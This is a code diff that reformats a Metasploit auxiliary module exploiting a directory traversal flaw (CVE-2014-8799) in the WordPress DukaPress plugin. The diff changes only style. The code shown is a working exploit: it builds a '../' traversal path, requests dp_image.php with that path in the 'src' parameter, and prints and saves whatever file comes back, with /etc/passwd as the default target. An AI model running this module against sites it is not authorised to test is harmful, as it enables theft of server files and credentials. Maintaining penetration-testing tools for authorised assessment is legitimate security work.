@@ -9,33 +9,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in WordPress Plugin
-        "DukaPress" version <= 2.5.3, allowing to read arbitrary files with the
-        web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress DukaPress Plugin File Read Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in WordPress Plugin
+          "DukaPress" version <= 2.5.3, allowing to read arbitrary files with the
+          web server privileges.
+        },
+        'References' => [
           ['EDB', '35346'],
           ['CVE', '2014-8799'],
           ['WPVDB', '7731'],
           ['OSVDB', '115130']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Kacper Szurek', # Vulnerability discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ])
+      ]
+    )
   end
 
   def check
@@ -43,20 +45,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    traversal = "../" * datastore['DEPTH']
+    traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
-    filename = filename[1, filename.length] if filename =~ /^\//
+    filename = filename[1, filename.length] if filename =~ %r{^/}
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
+      'uri' => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
       'vars_get' =>
         {
           'src' => "#{traversal}#{filename}"
         }
     })
 
-    if res && res.code == 200 && res.body.length > 0
+    if res && res.code == 200 && !res.body.empty?
 
       print_status('Downloading file...')
       print_line("\n#{res.body}")
@@ -73,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good("File saved in: #{path}")
     else
-      print_error("Nothing was downloaded. You can try to change the DEPTH parameter.")
+      print_error('Nothing was downloaded. You can try to change the DEPTH parameter.')
     end
   end
 end
